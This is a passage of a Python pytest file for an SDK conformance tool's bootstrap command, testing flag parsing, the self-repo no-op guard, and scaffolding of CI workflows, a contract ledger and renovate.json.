"""Tests for the bootstrap command and its helpers.

Covers _bootstrap_file in isolation, and the full _cmd_bootstrap dispatch
(SKILL.md + CI workflow shims + .gitignore) via the CLI entrypoint so the
tests exercise the same code path a caller would use.
"""

from __future__ import annotations

import json
import pathlib
import re

import pytest
from conformance.bootstrap import extract as extract_mod
from conformance.bootstrap.args import BOOTSTRAP_USAGE, FLAGS, parse_bootstrap_args
from conformance.bootstrap.autodetect import derive_app_name_from_dir
from conformance.bootstrap.command import _bootstrap_file
from conformance.bootstrap.render import (
    MANAGED_ACTION_FILES,
    MANAGED_WORKFLOWS,
    RETIRED_WORKFLOWS,
    render,
)
from conformance.cli import _cmd_bootstrap

# ---------------------------------------------------------------------------
# _bootstrap_file (always-overwrite semantics)
# ---------------------------------------------------------------------------


def test_bootstrap_file_creates_new(tmp_path: pathlib.Path) -> None:
    dest = tmp_path / "sub" / "SKILL.md"
    _bootstrap_file(dest, "content")
    assert dest.read_text() == "content"


def test_bootstrap_file_creates_parent_dirs(tmp_path: pathlib.Path) -> None:
    dest = tmp_path / "a" / "b" / "c" / "file.md"
    _bootstrap_file(dest, "content")
    assert dest.exists()


def test_bootstrap_file_overwrites_existing(tmp_path: pathlib.Path) -> None:
    dest = tmp_path / "SKILL.md"
    dest.write_text("original")
    _bootstrap_file(dest, "new content")
    assert dest.read_text() == "new content"


def test_bootstrap_file_prints_installed_for_new(
    tmp_path: pathlib.Path, capsys: pytest.CaptureFixture[str]
) -> None:
    dest = tmp_path / "SKILL.md"
    _bootstrap_file(dest, "content")
    assert "installed" in capsys.readouterr().out


def test_bootstrap_file_prints_updated_for_overwrite(
    tmp_path: pathlib.Path, capsys: pytest.CaptureFixture[str]
) -> None:
    dest = tmp_path / "SKILL.md"
    dest.write_text("old")
    _bootstrap_file(dest, "new")
    assert "updated" in capsys.readouterr().out


def test_bootstrap_file_prints_ok_up_to_date_for_unchanged_content(
    tmp_path: pathlib.Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """Re-writing identical content must not print `updated:` -- otherwise
    every bootstrap-based remediation would report every always-overwrite
    managed file as touched, not just the one(s) that actually drifted (see
    touched_files in remediate-finding.prose.md)."""
    dest = tmp_path / "SKILL.md"
    dest.write_text("same content")
    _bootstrap_file(dest, "same content")
    out = capsys.readouterr().out
    assert "ok (up to date)" in out
    assert "updated" not in out


def test_bootstrap_file_does_not_rewrite_unchanged_content(
    tmp_path: pathlib.Path,
) -> None:
    dest = tmp_path / "SKILL.md"
    dest.write_text("same content")
    mtime_before = dest.stat().st_mtime_ns
    _bootstrap_file(dest, "same content")
    assert dest.stat().st_mtime_ns == mtime_before


# ---------------------------------------------------------------------------
# parse_bootstrap_args
# ---------------------------------------------------------------------------


def test_parse_bootstrap_args_defaults() -> None:
    # "" for unit_tests_workflow means "not explicitly set" — _cmd_bootstrap
    # auto-detects it from an existing managed workflow file, falling back to
    # "tests.yaml" (mirrors app_name and services_script below).
    result = parse_bootstrap_args([])
    assert result == {
        "unit_tests_workflow": "",
        "app_name": "",
        "app_image_name": "",
        "enable_e2e": "true",
        "services_script": "",
        "system_deps": "",
        # "" = inherit the SDK's own floor / registry default, i.e. render no
        # line at all — so an app that never opted up is byte-identical to the
        # canonical and C002 stays silent.
        "unit_coverage_fail_under": "",
        "use_ghcr_base": "",
        "enforce": "",
        "conformance_blocking": "",
        "renovate_automerge": "",
        # Presence flag: "false" unless --resync is passed, so a bare
        # re-run never rewrites the write-if-absent tests.yaml scaffold.
        "resync": "false",
    }


def test_parse_bootstrap_args_space_separated() -> None:
    result = parse_bootstrap_args(["--unit-tests-workflow", "ci.yaml"])
    assert result["unit_tests_workflow"] == "ci.yaml"


def test_parse_bootstrap_args_equals_form() -> None:
    result = parse_bootstrap_args(["--unit-tests-workflow=custom.yaml"])
    assert result["unit_tests_workflow"] == "custom.yaml"


def test_parse_bootstrap_args_both_flags() -> None:
    result = parse_bootstrap_args(
        ["--app-name", "connector", "--unit-tests-workflow", "ci.yaml"]
    )
    assert result["app_name"] == "connector"
    assert result["unit_tests_workflow"] == "ci.yaml"


# --------------------------------------------------------------------------
# Retired flags: a caller still passing one must not be broken by it (the
# invocation lives in app-repo runbooks and CI steps we don't control), but
# must be told. Warn on stderr, ignore the flag AND its value, carry on.
# --------------------------------------------------------------------------


def test_retired_flag_space_form_is_ignored_with_a_warning(
    capsys: pytest.CaptureFixture[str],
) -> None:
    result = parse_bootstrap_args(["--package-name", "myapp", "--app-name", "mysql"])
    assert "package_name" not in result
    # The value must be consumed too, not left to be read as another flag.
    assert result["app_name"] == "mysql"
    err = capsys.readouterr().err
    assert "--package-name" in err
    assert "was removed" in err


def test_retired_flag_equals_form_is_ignored_with_a_warning(
    capsys: pytest.CaptureFixture[str],
) -> None:
    result = parse_bootstrap_args(["--package-name=myapp", "--app-name", "mysql"])
    assert result["app_name"] == "mysql"
    assert "--package-name" in capsys.readouterr().err


def test_retired_flag_alone_still_parses(capsys: pytest.CaptureFixture[str]) -> None:
    result = parse_bootstrap_args(["--package-name", "myapp"])
    assert result["app_name"] == ""
    assert "--package-name" in capsys.readouterr().err


def test_parse_bootstrap_args_app_name() -> None:
    result = parse_bootstrap_args(["--app-name", "mysql"])
    assert result["app_name"] == "mysql"


def test_parse_bootstrap_args_app_name_equals_form() -> None:
    result = parse_bootstrap_args(["--app-name=openapi"])
    assert result["app_name"] == "openapi"


def test_parse_bootstrap_args_app_image_name() -> None:
    result = parse_bootstrap_args(["--app-image-name", "atlan-mysql-app"])
    assert result["app_image_name"] == "atlan-mysql-app"


def test_parse_bootstrap_args_enable_e2e_false() -> None:
    result = parse_bootstrap_args(["--enable-e2e", "false"])
    assert result["enable_e2e"] == "false"


def test_parse_bootstrap_args_enable_e2e_equals_form() -> None:
    result = parse_bootstrap_args(["--enable-e2e=false"])
    assert result["enable_e2e"] == "false"


def test_parse_bootstrap_args_rejects_unknown_flag(
    capsys: pytest.CaptureFixture[str],
) -> None:
    """A misspelled/unrecognized flag must error, not silently fall through to
    defaults — this parser now validates known flags' values, so an unknown
    flag name should be held to the same standard rather than being dropped."""
    with pytest.raises(SystemExit) as exc_info:
        parse_bootstrap_args(["--pakcage-name", "myapp"])
    assert exc_info.value.code == 2
    assert "--pakcage-name" in capsys.readouterr().err


def test_parse_bootstrap_args_unknown_flag_after_valid_ones(
    capsys: pytest.CaptureFixture[str],
) -> None:
    with pytest.raises(SystemExit) as exc_info:
        parse_bootstrap_args(["--app-name", "mysql", "--bogus-flag", "x"])
    assert exc_info.value.code == 2
    assert "--bogus-flag" in capsys.readouterr().err


def test_parse_bootstrap_args_known_flag_missing_value(
    capsys: pytest.CaptureFixture[str],
) -> None:
    """A recognized flag given as the last token with no value must be
    reported as missing its value, not misidentified as unknown."""
    with pytest.raises(SystemExit) as exc_info:
        parse_bootstrap_args(["--enforce"])
    assert exc_info.value.code == 2
    err = capsys.readouterr().err
    assert "--enforce" in err
    assert "requires a value" in err
    assert "unknown option" not in err


# ---------------------------------------------------------------------------
# _cmd_bootstrap (full integration)
# ---------------------------------------------------------------------------


def test_cmd_bootstrap_writes_skill_md(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    dest = tmp_path / ".claude" / "skills" / "remediate" / "SKILL.md"
    assert dest.read_text() == render("remediate.md")


def _seed_conformance_pyproject(repo_root: pathlib.Path) -> None:
    """Create a minimal packages/conformance/pyproject.toml naming this exact
    package, matching what the real SDK monorepo checkout has on disk."""
    conformance_dir = repo_root / "packages" / "conformance"
    conformance_dir.mkdir(parents=True, exist_ok=True)
    (conformance_dir / "pyproject.toml").write_text(
        '[project]\nname = "atlan-application-sdk-conformance"\nversion = "0.0.0"\n'
    )


def test_cmd_bootstrap_is_a_no_op_inside_conformance_repo(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """bootstrap writes nothing at all when run inside the SDK's own repo.

    packages/conformance/pyproject.toml naming this exact package only exists
    in the atlan-application-sdk-conformance package's own source checkout,
    never in a consumer app repo (which installs the package via pip) — its
    presence is the signal that every file bootstrap would otherwise manage
    here (SKILL.md, the workflow/action shims, tests.yaml, renovate.json,
    contract_schema.lock.json) is either hand-maintained or simply doesn't
    apply to a library repo. A prior guard covered only SKILL.md and missed
    MANAGED_WORKFLOWS/MANAGED_ACTION_FILES, which are just as hand-authored
    here — this asserts the whole write phase is skipped, not file-by-file.
    """
    _seed_conformance_pyproject(tmp_path)
    # Seed one MANAGED_WORKFLOWS file with content that diverges from what
    # bootstrap would render, mirroring this repo's real hand-authored
    # conformance.yaml — proves it survives untouched, not just absent files.
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    custom_conformance = wf_dir / "conformance.yaml"
    custom_conformance.write_text("# hand-authored, not bootstrap's template\n")

    monkeypatch.chdir(tmp_path)
    assert _cmd_bootstrap([]) == 0

    assert not (tmp_path / ".claude" / "skills" / "remediate" / "SKILL.md").exists()
    assert (
        custom_conformance.read_text() == "# hand-authored, not bootstrap's template\n"
    )
    for name in MANAGED_WORKFLOWS:
        if name != "conformance.yaml":
            assert not (wf_dir / name).exists()
    for dest_rel, _template_name in MANAGED_ACTION_FILES:
        assert not (tmp_path / dest_rel).exists()
    assert not (tmp_path / ".github" / "workflows" / "tests.yaml").exists()
    assert not (tmp_path / "contract_schema.lock.json").exists()
    assert not (tmp_path / "renovate.json").exists()
    assert not (tmp_path / ".gitignore").exists()


def test_cmd_bootstrap_is_a_no_op_when_invoked_from_inside_packages_conformance(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The no-op guard must hold regardless of which subdirectory bootstrap is
    invoked from — not just the repo root.

    A cwd-relative existence check (``cwd / "packages" / "conformance"``)
    only fires when cwd IS the repo root; invoking from inside
    packages/conformance/ itself (e.g. a local `cd packages/conformance &&
    uv run atlan-application-sdk-conformance bootstrap`) would silently miss
    the guard and scaffold consumer-app files into this repo.
    """
    _seed_conformance_pyproject(tmp_path)
    conformance_dir = tmp_path / "packages" / "conformance"

    monkeypatch.chdir(conformance_dir)
    assert _cmd_bootstrap([]) == 0

    assert not (
        conformance_dir / ".claude" / "skills" / "remediate" / "SKILL.md"
    ).exists()
    assert not (tmp_path / ".claude" / "skills" / "remediate" / "SKILL.md").exists()


def test_cmd_bootstrap_does_not_no_op_for_coincidental_packages_conformance_dir(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A consumer monorepo that happens to contain a bare packages/conformance/
    directory (no matching pyproject.toml, or one naming a different package)
    must NOT trip the self-detection guard and silently skip scaffolding.

    Regression test for keying the guard on a bare directory-name check,
    which would exit 0 with a "skipped" message and zero files written in
    this scenario — a silent under-install indistinguishable from success.
    """
    (tmp_path / "packages" / "conformance").mkdir(parents=True)

    monkeypatch.chdir(tmp_path)
    assert _cmd_bootstrap([]) == 0

    assert (tmp_path / ".claude" / "skills" / "remediate" / "SKILL.md").exists()
    assert (tmp_path / ".github" / "workflows" / "tests.yaml").exists()


def test_cmd_bootstrap_does_not_no_op_when_pyproject_names_different_package(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A packages/conformance/pyproject.toml that names an unrelated package
    must not trip the guard either — only this exact package name does."""
    conformance_dir = tmp_path / "packages" / "conformance"
    conformance_dir.mkdir(parents=True)
    (conformance_dir / "pyproject.toml").write_text(
        '[project]\nname = "some-other-package"\nversion = "0.0.0"\n'
    )

    monkeypatch.chdir(tmp_path)
    assert _cmd_bootstrap([]) == 0

    assert (tmp_path / ".claude" / "skills" / "remediate" / "SKILL.md").exists()


def test_cmd_bootstrap_does_not_no_op_when_pyproject_is_malformed_toml(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A packages/conformance/pyproject.toml that exists but fails to parse as
    TOML must not trip the guard either -- it can't be confirmed to name this
    exact package, so bootstrap must proceed normally rather than silently
    no-op the entire write phase on an unreadable file."""
    conformance_dir = tmp_path / "packages" / "conformance"
    conformance_dir.mkdir(parents=True)
    (conformance_dir / "pyproject.toml").write_text("not valid toml [[[")

    monkeypatch.chdir(tmp_path)
    assert _cmd_bootstrap([]) == 0

    assert (tmp_path / ".claude" / "skills" / "remediate" / "SKILL.md").exists()


@pytest.mark.parametrize("help_flag", ["--help", "-h"])
def test_cmd_bootstrap_help_prints_usage_and_writes_nothing(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    help_flag: str,
) -> None:
    """--help/-h must short-circuit before any file is written.

    `main()` checks for `-h`/`--help` before `parse_bootstrap_args` runs at
    all — without that explicit guard, `bootstrap --help` would fall through
    and execute the real, mutating bootstrap — surprising callers who expect
    `--help` to be a no-op.
    """
    monkeypatch.chdir(tmp_path)
    exit_code = _cmd_bootstrap([help_flag])
    assert exit_code == 0
    assert (
        "usage: atlan-application-sdk-conformance bootstrap" in capsys.readouterr().out
    )
    assert list(tmp_path.iterdir()) == []


def test_cmd_bootstrap_writes_all_managed_workflows(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf_dir = tmp_path / ".github" / "workflows"
    for name in MANAGED_WORKFLOWS:
        dest = wf_dir / name
        assert dest.exists(), f"Missing: {name}"
        assert dest.read_text() == render(name), f"Content mismatch: {name}"


def test_cmd_bootstrap_writes_all_managed_action_files(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """conformance-reusable.yaml resolves `./...` paths against the caller's

    checkout, so bootstrap must vendor the composite action + arg-building
    script it needs into every consumer repo, not just .github/workflows/.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    for dest_rel, template_name in MANAGED_ACTION_FILES:
        dest = tmp_path / dest_rel
        assert dest.exists(), f"Missing: {dest_rel}"
        assert dest.read_text() == render(
            template_name
        ), f"Content mismatch: {dest_rel}"


@pytest.mark.parametrize("dest_rel,template_name", MANAGED_ACTION_FILES)
def test_cmd_bootstrap_managed_action_files_always_overwrite(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    dest_rel: str,
    template_name: str,
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    dest = tmp_path / dest_rel
    dest.write_text("corrupted content")
    _cmd_bootstrap([])
    assert dest.read_text() == render(template_name)


def test_cmd_bootstrap_adds_remediation_to_gitignore(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    assert "remediation/" in (tmp_path / ".gitignore").read_text()


def test_cmd_bootstrap_always_overwrites_on_rerun(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Re-running bootstrap always rewrites managed files (drift eradication)."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    # Corrupt one workflow, then verify bootstrap fixes it.
    wf = tmp_path / ".github" / "workflows" / "conformance.yaml"
    wf.write_text("corrupted content")
    _cmd_bootstrap([])
    assert wf.read_text() == render("conformance.yaml")


def test_cmd_bootstrap_gitignore_not_duplicated_on_rerun(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    _cmd_bootstrap([])
    assert (tmp_path / ".gitignore").read_text().count("remediation/") == 1


def test_cmd_bootstrap_does_not_modify_existing_gitignore(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Bootstrap is write-if-absent for .gitignore; it never modifies an existing file."""
    monkeypatch.chdir(tmp_path)
    gi = tmp_path / ".gitignore"
    original = "*.pyc\n.env\n"
    gi.write_text(original)
    _cmd_bootstrap([])
    assert gi.read_text() == original


# ---------------------------------------------------------------------------
# contract_schema.lock.json scaffold — write-if-absent semantics
#
# B006 (StaleContractLedger) is a hard FAIL-tier rule active from day one:
# without a ledger, the ledger-absent fallback loads the SDK's own bundled
# ledger (which has none of the app's fields recorded), so any app with
# existing entrypoint contract fields fails enforced mode on its very first
# run. Bootstrap must seed a baseline the same way `gen-contract-ledger`
# would, not leave the app to discover the gap after enabling enforcement.
# ---------------------------------------------------------------------------


def test_cmd_bootstrap_writes_contract_ledger(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    assert (tmp_path / "contract_schema.lock.json").exists()


def test_cmd_bootstrap_contract_ledger_holds_only_consumer_contracts(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A freshly scaffolded ledger records what bootstrap found in the app's own
    source and nothing else. It must NOT be seeded from the SDK's packaged
    ledger: build_ledger is append-only, so every SDK template contract copied
    in would be permanent, and any app class sharing one of those names would
    draw B005 "field removed" for every SDK field it does not have, forever.
    Same invariant as `gen-contract-ledger`, via the shared baseline helper."""
    import json

    from conformance.suite.checks.deprecation._ledger_schema import load_ledger

    (tmp_path / "app.py").write_text(
        "from application_sdk.app import App\n\n"
        "class MyInput:\n    only_mine: str = ''\n\n"
        "class MyApp(App):\n"
        "    async def run(self, input: MyInput) -> None:\n        pass\n",
        encoding="utf-8",
    )
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    payload = json.loads((tmp_path / "contract_schema.lock.json").read_text())
    contracts = {f["contract"] for f in payload["fields"]}
    assert contracts == {"MyInput"}

    # Nothing from the SDK's own bundled ledger leaked in.
    bundled = {f.contract for f in load_ledger(None).fields}
    assert (
        bundled
    ), "the packaged SDK ledger should be non-empty for this to mean anything"
    assert not (contracts & bundled)


def test_cmd_bootstrap_contract_ledger_is_empty_without_consumer_contracts(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """An app with no entrypoint contracts yet scaffolds an EMPTY ledger, not
    the SDK's. B006 has nothing to be stale against, which is the correct
    day-one state."""
    import json

    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    payload = json.loads((tmp_path / "contract_schema.lock.json").read_text())
    assert payload["fields"] == []


def test_cmd_bootstrap_contract_ledger_is_write_if_absent(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A second bootstrap run must NOT overwrite an already-committed ledger —
    the ledger is append-only and owned by `gen-contract-ledger`, not bootstrap."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    ledger_path = tmp_path / "contract_schema.lock.json"
    ledger_path.write_text('{"version": 1, "fields": []}\n')
    _cmd_bootstrap([])
    assert ledger_path.read_text() == '{"version": 1, "fields": []}\n'


def test_cmd_bootstrap_contract_ledger_not_in_managed_workflows() -> None:
    assert "contract_schema.lock.json" not in MANAGED_WORKFLOWS


def test_cmd_bootstrap_returns_zero(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    assert _cmd_bootstrap([]) == 0


# ---------------------------------------------------------------------------
# Template fidelity assertions
# ---------------------------------------------------------------------------


def test_parse_bootstrap_args_enforce_false() -> None:
    result = parse_bootstrap_args(["--enforce", "false"])
    assert result["enforce"] == "false"


def test_parse_bootstrap_args_enforce_true() -> None:
    result = parse_bootstrap_args(["--enforce", "true"])
    assert result["enforce"] == "true"


def test_parse_bootstrap_args_enforce_equals_form() -> None:
    result = parse_bootstrap_args(["--enforce=false"])
    assert result["enforce"] == "false"


def test_parse_bootstrap_args_enforce_invalid(
    capsys: pytest.CaptureFixture[str],
) -> None:
    with pytest.raises(SystemExit) as exc_info:
        parse_bootstrap_args(["--enforce", "maybe"])
    assert exc_info.value.code == 2
    assert "--enforce" in capsys.readouterr().err


# ---------------------------------------------------------------------------
# The two granular 0-touch levers (--conformance-blocking /
# --renovate-automerge), which --enforce is the shorthand for. See FND-347:
# the tests gate being a required check is a third, separate lever that none
# of these three flags governs.
# ---------------------------------------------------------------------------


def test_every_flag_is_documented_in_usage() -> None:
    """Each flag must appear in --help.

    BOOTSTRAP_USAGE is the authoritative flag documentation (the parser's own
    docstring says so), and a lever nobody can find in --help is not
    separately expressible in any useful sense.
    """
    undocumented = [flag for flag in FLAGS if flag not in BOOTSTRAP_USAGE]
    assert not undocumented


@pytest.mark.parametrize(
    "flag,dest",
    [
        ("--conformance-blocking", "conformance_blocking"),
        ("--renovate-automerge", "renovate_automerge"),
    ],
)
@pytest.mark.parametrize("value", ["true", "false"])
def test_parse_bootstrap_args_granular_levers(flag: str, dest: str, value: str) -> None:
    assert parse_bootstrap_args([flag, value])[dest] == value
    assert parse_bootstrap_args([f"{flag}={value}"])[dest] == value


@pytest.mark.parametrize(
    "flag",
    ["--conformance-blocking", "--renovate-automerge", "--enforce", "--use-ghcr-base"],
)
def test_parse_bootstrap_args_tristate_invalid_names_its_own_flag(
    flag: str, capsys: pytest.CaptureFixture[str]
) -> None:
    """A bad value must be reported against the flag that carried it.

    The three tri-state flags share one validation loop, so a shared error
    message that always said ``--enforce`` would misdirect anyone who passed
    a granular lever — the exact confusion these separate names exist to
    prevent.
    """
    with pytest.raises(SystemExit) as exc_info:
        parse_bootstrap_args([flag, "maybe"])
    assert exc_info.value.code == 2
    err = capsys.readouterr().err
    assert flag in err
    assert "'maybe'" in err


@pytest.mark.parametrize(
    "flag",
    ["--conformance-blocking", "--renovate-automerge", "--enforce", "--use-ghcr-base"],
)
def test_parse_bootstrap_args_tristate_missing_value(
    flag: str, capsys: pytest.CaptureFixture[str]
) -> None:
    with pytest.raises(SystemExit) as exc_info:
        parse_bootstrap_args([flag])
    assert exc_info.value.code == 2
    err = capsys.readouterr().err
    assert flag in err
    assert "requires a value" in err


_EXIT_ZERO_SCHEDULE_PREFIX = (
    "exit-zero: ${{ github.event_name == 'schedule' "
    "|| github.event_name == 'workflow_dispatch' || "
)
_EXIT_ZERO_HARD = _EXIT_ZERO_SCHEDULE_PREFIX + "false }}"
_EXIT_ZERO_SOFT = _EXIT_ZERO_SCHEDULE_PREFIX + "true }}"
_FORCE_ALL_SCHEDULE = (
    "force-all: ${{ github.event_name == 'schedule' "
    "|| github.event_name == 'workflow_dispatch' }}"
)
_SCHEDULE_BLOCK = 'schedule:\n    - cron: "17 */6 * * *"'


def test_conformance_yaml_default_exit_zero_false() -> None:
    """Default bootstrap renders the full hard-gate expression (schedule/dispatch still exit-zero)."""
    content = render("conformance.yaml")
    assert _EXIT_ZERO_HARD in content


def test_conformance_yaml_exit_zero_true() -> None:
    """render() with exit_zero='true' renders the full soft-mode expression."""
    content = render("conformance.yaml", exit_zero="true")
    assert _EXIT_ZERO_SOFT in content


def test_cmd_bootstrap_enforce_false_writes_soft_mode(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """--enforce false writes the full soft-mode expression into conformance.yaml."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--enforce", "false"])
    conformance = (tmp_path / ".github" / "workflows" / "conformance.yaml").read_text()
    assert _EXIT_ZERO_SOFT in conformance


def test_cmd_bootstrap_enforce_true_writes_hard_mode(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """--enforce true writes the full hard-gate expression into conformance.yaml."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--enforce", "true"])
    conformance = (tmp_path / ".github" / "workflows" / "conformance.yaml").read_text()
    assert _EXIT_ZERO_HARD in conformance


def test_cmd_bootstrap_no_enforce_defaults_hard_mode(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Without --enforce, bootstrap defaults to the full hard-gate expression."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    conformance = (tmp_path / ".github" / "workflows" / "conformance.yaml").read_text()
    assert _EXIT_ZERO_HARD in conformance


def test_conformance_yaml_schedule_force_refresh_trigger() -> None:
    """Bootstrap wires the force-refresh schedule/dispatch trigger and force-all override."""
    content = render("conformance.yaml")
    assert _SCHEDULE_BLOCK in content
    assert "workflow_dispatch: {}" in content
    assert _FORCE_ALL_SCHEDULE in content


def test_conformance_workflow_contains_event_name() -> None:
    """The bundled workflow uses event_name, not the stale sdk-ref input."""
    content = render("conformance.yaml")
    assert "event_name:" in content
    assert "sdk-ref" not in content


def test_conformance_workflow_has_pull_requests_read() -> None:
    """pull-requests: read is required for dorny/paths-filter on private repos."""
    content = render("conformance.yaml")
    assert "pull-requests: read" in content


def test_conformance_upload_sarif_workflow_run_trigger() -> None:
    """Upload workflow is triggered by the Conformance workflow_run on main."""
    content = render("conformance-upload-sarif.yaml")
    assert 'workflows: ["Conformance"]' in content
    assert "workflow_run" in content
    assert "branches: [main]" in content


def test_conformance_upload_sarif_decoupled_from_gate() -> None:
    """Upload workflow uses continue-on-error on download so it always exits 0."""
    content = render("conformance-upload-sarif.yaml")
    assert "continue-on-error: true" in content


def test_conformance_upload_sarif_passes_ref_and_sha() -> None:
    """Upload workflow passes head_branch and head_sha so SARIF is anchored to the triggering commit."""
    content = render("conformance-upload-sarif.yaml")
    assert "workflow_run.head_branch" in content
    assert "workflow_run.head_sha" in content


def test_conformance_upload_sarif_has_required_permissions() -> None:
    """security-events: write uploads SARIF; actions: read downloads artifacts from the triggering run."""
    content = render("conformance-upload-sarif.yaml")
    assert "security-events: write" in content
    assert "actions: read" in content


def test_conformance_upload_sarif_covers_all_series() -> None:
    """Upload workflow covers all four conformance series slugs."""
    content = render("conformance-upload-sarif.yaml")
    for slug in ("ci", "error-handling", "prescriptions", "optimizations"):
        assert slug in content, f"Missing series slug: {slug}"


def test_all_shims_have_atlanhq_uses_reference() -> None:
    """Every managed workflow delegates to atlanhq/* (or a known inline file)."""
    # These files contain inline logic (no `uses: atlanhq/...`) but are still standard.
    inline_ok = {"release-gate.yaml", "conformance-upload-sarif.yaml"}
    for name in MANAGED_WORKFLOWS:
        content = render(name)
        if name in inline_ok:
            continue
        assert "atlanhq/" in content, f"Missing atlanhq/ uses: reference in {name}"


def test_no_jinja2_placeholders_in_rendered_output() -> None:
    """Rendered templates must not contain any un-substituted << >> tokens."""
    for name in MANAGED_WORKFLOWS:
        content = render(name)
        assert "<< " not in content, f"Unresolved jinja2 placeholder in {name}"
        assert " >>" not in content, f"Unresolved jinja2 placeholder in {name}"


# ---------------------------------------------------------------------------
# Templating: parameterised substitution
# ---------------------------------------------------------------------------


def test_build_and_publish_default_unit_tests_workflow() -> None:
    content = render("build-and-publish.yaml")
    assert 'unit_tests_workflow_file: "tests.yaml"' in content


def test_build_and_publish_custom_unit_tests_workflow() -> None:
    content = render("build-and-publish.yaml", unit_tests_workflow="ci-tests.yaml")
    assert 'unit_tests_workflow_file: "ci-tests.yaml"' in content


def test_cmd_bootstrap_custom_args_propagate(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--app-name", "myapp", "--unit-tests-workflow", "run-tests.yaml"])
    build = (tmp_path / ".github" / "workflows" / "build-and-publish.yaml").read_text()
    tests = (tmp_path / ".github" / "workflows" / "tests.yaml").read_text()
    assert 'unit_tests_workflow_file: "run-tests.yaml"' in build
    assert 'app-name: "myapp"' in tests


# ---------------------------------------------------------------------------
# renovate.json scaffold — write-if-absent semantics
# ---------------------------------------------------------------------------


def test_cmd_bootstrap_writes_renovate_json(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    assert (tmp_path / "renovate.json").exists()


def test_cmd_bootstrap_renovate_json_not_in_managed_workflows() -> None:
    assert "renovate.json" not in MANAGED_WORKFLOWS


def test_cmd_bootstrap_renovate_json_is_write_if_absent(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A second bootstrap run must NOT overwrite an already-customised renovate.json."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    rj = tmp_path / "renovate.json"
    rj.write_text('{"customised": true}\n')
    _cmd_bootstrap([])
    assert rj.read_text() == '{"customised": true}\n'


def test_cmd_bootstrap_renovate_json_recreated_when_deleted(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Delete renovate.json → re-run bootstrap → file regenerated from canonical."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    rj = tmp_path / "renovate.json"
    rj.unlink()
    _cmd_bootstrap([])
    assert rj.exists()
    assert rj.read_text() == render("renovate.json")


def test_renovate_json_contains_fleet_preset() -> None:
    content = render("renovate.json")
    assert "atlanhq/application-sdk//renovate-config/default.json" in content


def test_renovate_json_contains_schema() -> None:
    content = render("renovate.json")
    assert "renovate-schema.json" in content


def test_renovate_json_default_no_automerge_override() -> None:
    """Default bootstrap does not add automerge overrides (auto-merge enabled via preset)."""
    content = render("renovate.json")
    assert '"automerge": false' not in content
    assert "packageRules" not in content


def test_renovate_json_automerge_false_adds_overrides() -> None:
    """--automerge false injects catch-all rule that disables auto-merge."""
    content = render("renovate.json", automerge="false")
    assert '"automerge": false' in content
    assert '"platformAutomerge": false' in content
    assert "packageRules" in content
    assert "lockFileMaintenance" in content


def test_renovate_json_uses_match_package_names_not_patterns() -> None:
    """Renovate v37+ deprecates matchPackagePatterns; template must use matchPackageNames."""
    content = render("renovate.json", automerge="false")
    assert "matchPackageNames" in content
    assert "matchPackagePatterns" not in content


def test_renovate_json_automerge_false_is_valid_json() -> None:
    """Rendered renovate.json with automerge=false is parseable JSON."""
    import json

    content = render("renovate.json", automerge="false")
    parsed = json.loads(content)
